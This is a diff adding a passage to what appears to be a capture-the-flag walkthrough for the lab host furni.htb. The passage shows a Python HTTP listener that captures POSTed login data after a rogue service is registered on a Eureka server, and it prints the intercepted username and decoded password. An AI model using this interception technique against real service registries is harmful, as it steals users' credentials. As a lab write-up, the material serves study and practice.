@@ -167,7 +167,27 @@ Running this we can see that the service "test" is registered on the eureka serv
 
 <img width="936" height="314" alt="Screenshot 2025-09-03 at 03 54 07" src="https://github.com/user-attachments/assets/7045132e-ed35-4e76-b7b9-c4b7cfe0e9fa" />
 
+Then running a listening HTTP Python Server:
 
+```
+#!/usr/bin/env python3
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        print(self.headers)
+        print(self.rfile.read(int(self.headers.get('Content-Length', 0))).decode())
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"POST received")
 
+if __name__ == "__main__":
+    HTTPServer(('', 80), Handler).serve_forever()
+```
+
+We finally get:
+
+```username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=H_qM_kLKtB-7PSzqaLXHBZkcVjh3V1Np_o7VkUthTPkzIIjsLcO8x3Wv0H6WC02OUJjzMq94ewBHZGBEn7jj9X1Uec8DE-re```
+
+Cool. Decoding the URL-encoding and we get the password: ```IL!veT0Be&BeT0L0ve```
 
